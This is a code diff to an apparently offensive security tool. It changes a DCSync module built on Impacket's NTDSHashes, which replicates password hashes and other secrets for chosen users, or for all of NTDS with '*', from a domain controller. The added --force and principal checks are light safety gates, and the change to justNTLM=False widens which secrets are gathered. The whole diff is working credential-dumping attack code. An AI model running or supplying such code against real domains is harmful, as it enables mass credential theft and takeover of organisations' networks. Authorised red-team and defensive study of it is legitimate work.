@@ -45,6 +45,8 @@ class Dcsync:
         **kwargs: Any,
     ) -> dict[str, Any]:
         require_impacket("dcsync")
+        if not force:
+            raise RuntimeError("dcsync requires --force")
         principals_source = kwargs.get("principals") or kwargs.get("users")
         just_dc_user = kwargs.get("just_user") or kwargs.get("sam")
         history = bool(kwargs.get("history"))
@@ -65,8 +67,9 @@ class Dcsync:
                     if line.strip()
                 ]
             else:
-                principals = [str(principals_source)]
-        # empty principals = full dump
+                principals = [
+                    part.strip() for part in str(principals_source).split(",") if part.strip()
+                ]
 
         session.log(
             "dcsync.start",
@@ -110,26 +113,35 @@ class Dcsync:
             text = str(secret)
             collected.append({"raw": text, "type": secret_type})
 
+        if not principals:
+            raise RuntimeError(
+                "dcsync requires -P sam=<user> or -P principals=<file-or-user>. "
+                "Pass -P just_user=* only for an authorized full NTDS dump."
+            )
+        dump_users: list[str | None] = list(principals)
+        if len(principals) == 1 and str(principals[0]).strip() == "*":
+            dump_users = [None]
         no_lm = False
         try:
-            ntds_hashes = NTDSHashes(
-                None,
-                None,
-                isRemote=True,
-                history=history,
-                noLMHash=no_lm,
-                remoteOps=remote,
-                useVSSMethod=False,
-                justNTLM=True,
-                pwdLastSet=True,
-                resumeSession=None,
-                outputFileName=None,
-                justUser=principals[0] if len(principals) == 1 else None,
-                printUserStatus=False,
-                perSecretCallback=lambda st, sec: _collect(st, sec),
-                skipUser=None,
-            )
-            ntds_hashes.dump()
+            for just_user in dump_users:
+                ntds_hashes = NTDSHashes(
+                    None,
+                    None,
+                    isRemote=True,
+                    history=history,
+                    noLMHash=no_lm,
+                    remoteOps=remote,
+                    useVSSMethod=False,
+                    justNTLM=False,
+                    pwdLastSet=True,
+                    resumeSession=None,
+                    outputFileName=None,
+                    justUser=just_user,
+                    printUserStatus=False,
+                    perSecretCallback=lambda st, sec: _collect(st, sec),
+                    skipUser=None,
+                )
+                ntds_hashes.dump()
         finally:
             with contextlib.suppress(Exception):
                 remote.finish()
